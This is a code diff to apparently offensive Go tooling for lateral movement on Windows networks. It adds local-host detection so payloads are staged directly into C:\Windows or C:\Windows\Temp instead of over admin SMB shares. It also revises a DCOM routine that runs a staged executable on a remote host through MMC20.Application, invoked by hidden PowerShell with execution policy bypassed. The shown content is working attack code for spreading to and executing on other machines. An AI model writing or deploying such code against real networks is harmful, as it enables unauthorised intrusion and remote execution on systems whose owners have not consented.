@@ -102,11 +102,54 @@ func smbWriteAs(uncPath string, data []byte, user, pass string) error {
 	return os.WriteFile(uncPath, data, 0644)
 }
 
+// isLocalHost returns true when host resolves to one of the machine's own IPs.
+// Loopback SMB (\\<own IP>\C$) silently fails on Windows even with admin creds,
+// so callers must stage files directly instead of over the network share.
+func isLocalHost(host string) bool {
+	addrs, err := net.LookupHost(host)
+	if err != nil {
+		return host == "127.0.0.1" || strings.EqualFold(host, "localhost")
+	}
+	ifaces, _ := net.Interfaces()
+	local := make(map[string]bool)
+	for _, iface := range ifaces {
+		ifAddrs, _ := iface.Addrs()
+		for _, a := range ifAddrs {
+			if ipnet, ok := a.(*net.IPNet); ok {
+				local[ipnet.IP.String()] = true
+			}
+		}
+	}
+	local["127.0.0.1"] = true
+	local["::1"] = true
+	for _, a := range addrs {
+		if local[a] {
+			return true
+		}
+	}
+	return false
+}
+
 // smbStage stages data to \\host\ADMIN$\<name> or \\host\C$\Windows\Temp\<name>.
 // It first tries the existing session (fastest, works when the caller already
 // has access), then falls back to explicit-credential impersonation when
 // user/pass are provided. Works in service and SYSTEM contexts.
+// For local targets, writes directly to avoid the Windows loopback SMB restriction.
 func smbStage(host, name, user, pass string, data []byte) (string, error) {
+	// Windows blocks loopback SMB writes to admin shares (even with admin creds)
+	// without returning a useful error. Write directly when targeting localhost.
+	if isLocalHost(host) {
+		local1 := `C:\Windows\` + name
+		if err := os.WriteFile(local1, data, 0644); err == nil {
+			return local1, nil
+		}
+		local2 := `C:\Windows\Temp\` + name
+		if err := os.WriteFile(local2, data, 0644); err == nil {
+			return local2, nil
+		}
+		return "", fmt.Errorf("stage to %s (local): failed to write to Windows or Temp", host)
+	}
+
 	unc1 := `\\` + host + `\ADMIN$\` + name
 	unc2 := `\\` + host + `\C$\Windows\Temp\` + name
 
@@ -467,11 +510,13 @@ func lateralDCOM(host string, data []byte, svcName, user, pass string) (string, 
 	}
 
 	// MMC20.Application via PowerShell — works without local admin on target
-	// (only requires DCOM access, which Domain Admins have by default)
-	safePath := strings.ReplaceAll(localPath, `'`, `''`)
+	// (only requires DCOM access, which Domain Admins have by default).
+	// Call the EXE directly as sFile (no cmd.exe wrapper) — avoids the single-quote
+	// quoting problem where cmd.exe treats 'path' as a literal filename with quote chars.
+	safePath := strings.ReplaceAll(localPath, `"`, `\"`)
 	psCmd := fmt.Sprintf(
 		`$c=[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","%s"));`+
-			`$c.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c start /B '%s'","7")`,
+			`$c.Document.ActiveView.ExecuteShellCommand("%s",$null,"","7")`,
 		host, safePath,
 	)
 	cmd := fmt.Sprintf(`powershell -NoP -W Hidden -Exec Bypass -C "%s"`,
